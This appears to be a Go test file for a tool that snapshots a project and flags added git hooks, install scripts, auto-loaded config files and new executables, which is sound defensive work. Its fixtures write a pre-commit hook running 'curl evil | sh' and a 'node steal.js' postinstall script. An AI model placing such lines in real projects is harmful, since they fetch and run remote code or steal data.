package audit

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func write(t *testing.T, root, rel, content string, mode os.FileMode) {
	t.Helper()
	p := filepath.Join(root, rel)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(content), mode); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(p, mode); err != nil {
		t.Fatal(err)
	}
}

func snap(t *testing.T, root string) *Snapshot {
	t.Helper()
	s, err := Take(root, nil)
	if err != nil {
		t.Fatal(err)
	}
	return s
}

func kinds(cs []Change) string {
	var parts []string
	for _, c := range cs {
		parts = append(parts, c.Kind+":"+c.Path+":"+c.Detail)
	}
	return strings.Join(parts, "\n")
}

func TestNoChangesNoReport(t *testing.T) {
	root := t.TempDir()
	write(t, root, "package.json", `{"scripts":{"test":"jest"}}`, 0o644)
	write(t, root, "src/app.js", "x", 0o644)
	if d := Diff(snap(t, root), snap(t, root)); len(d) != 0 {
		t.Errorf("unexpected changes: %s", kinds(d))
	}
}

func TestDetectsAddedHookAndNewPackageScript(t *testing.T) {
	root := t.TempDir()
	write(t, root, ".git/config", "[core]\n", 0o644)
	write(t, root, ".git/hooks/pre-commit.sample", "#!/bin/sh\n", 0o755)
	write(t, root, "package.json", `{"name":"x","scripts":{"test":"jest"}}`, 0o644)
	before := snap(t, root)

	write(t, root, ".git/hooks/pre-commit", "#!/bin/sh\ncurl evil | sh\n", 0o755)
	write(t, root, "package.json", `{"name":"x","scripts":{"test":"jest","postinstall":"node steal.js"}}`, 0o644)
	got := kinds(Diff(before, snap(t, root)))
	for _, want := range []string{
		"added:.git/hooks/pre-commit:(executable)",
		"modified:package.json:",
		"script-added:package.json:postinstall: \"node steal.js\"",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("missing %q in:\n%s", want, got)
		}
	}
	if strings.Contains(got, "script-added:package.json:test") || strings.Contains(got, "script-changed") {
		t.Errorf("unchanged script reported:\n%s", got)
	}
}

func TestScriptChangeAndRemoval(t *testing.T) {
	root := t.TempDir()
	write(t, root, "composer.json", `{"scripts":{"post-install-cmd":["a","b"],"old":"x"}}`, 0o644)
	before := snap(t, root)
	write(t, root, "composer.json", `{"scripts":{"post-install-cmd":["a","evil"]}}`, 0o644)
	got := kinds(Diff(before, snap(t, root)))
	if !strings.Contains(got, "script-changed:composer.json:post-install-cmd") || !strings.Contains(got, "script-removed:composer.json:old") {
		t.Errorf("composer scripts:\n%s", got)
	}
}

func TestAutoLoadedAndExecutableFiles(t *testing.T) {
	root := t.TempDir()
	before := snap(t, root)
	write(t, root, ".envrc", "export X=1", 0o644)
	write(t, root, ".vscode/tasks.json", "{}", 0o644)
	write(t, root, ".github/workflows/ci.yml", "on: push", 0o644)
	write(t, root, "Makefile", "all:\n\techo", 0o644)
	write(t, root, "tools/run.sh", "#!/bin/sh", 0o755)
	write(t, root, "docs/readme.md", "hi", 0o644)
	got := kinds(Diff(before, snap(t, root)))
	for _, want := range []string{"added:.envrc", "added:.vscode/tasks.json", "added:.github/workflows/ci.yml", "added:Makefile", "added:tools/run.sh:(executable)"} {
		if !strings.Contains(got, want) {
			t.Errorf("missing %q in:\n%s", want, got)
		}
	}
	if strings.Contains(got, "readme.md") {
		t.Errorf("ordinary file reported:\n%s", got)
	}
}

func TestBecameExecutableAndRemoved(t *testing.T) {
	root := t.TempDir()
	write(t, root, "script.sh", "#!/bin/sh", 0o644)
	write(t, root, ".envrc", "x", 0o644)
	// A file that is neither watched nor executable is not tracked, so
	// chmod +x shows up as a new executable.
	before := snap(t, root)
	os.Chmod(filepath.Join(root, "script.sh"), 0o755)
	os.Remove(filepath.Join(root, ".envrc"))
	got := kinds(Diff(before, snap(t, root)))
	if !strings.Contains(got, "added:script.sh:(executable)") || !strings.Contains(got, "removed:.envrc") {
		t.Errorf("got:\n%s", got)
	}
}

func TestSkipsWorktreesNodeModulesAndGitInternals(t *testing.T) {
	root := t.TempDir()
	before := snap(t, root)
	write(t, root, ".worktrees/w/Makefile", "x", 0o644)
	write(t, root, "node_modules/pkg/bin.sh", "x", 0o755)
	write(t, root, ".git/objects/ab/cd", "x", 0o755)
	write(t, root, ".git/index", "x", 0o644)
	if d := Diff(before, snap(t, root)); len(d) != 0 {
		t.Errorf("should be ignored:\n%s", kinds(d))
	}
}

func TestExtraPatterns(t *testing.T) {
	root := t.TempDir()
	s0, _ := Take(root, []string{"*.service"})
	write(t, root, "deploy/app.service", "x", 0o644)
	s1, _ := Take(root, []string{"*.service"})
	if got := kinds(Diff(s0, s1)); !strings.Contains(got, "added:deploy/app.service") {
		t.Errorf("extra pattern ignored:\n%s", got)
	}
}

func TestSaveLoadRoundTrip(t *testing.T) {
	root := t.TempDir()
	write(t, root, "Makefile", "x", 0o644)
	s := snap(t, root)
	p := BaselinePath(t.TempDir(), "slug")
	if got, err := Load(p); err != nil || got != nil {
		t.Fatalf("missing baseline: %v %v", got, err)
	}
	if err := Save(p, s); err != nil {
		t.Fatal(err)
	}
	got, err := Load(p)
	if err != nil || len(got.Files) != len(s.Files) || len(Diff(got, s)) != 0 {
		t.Errorf("round trip: %v %+v", err, got)
	}
}
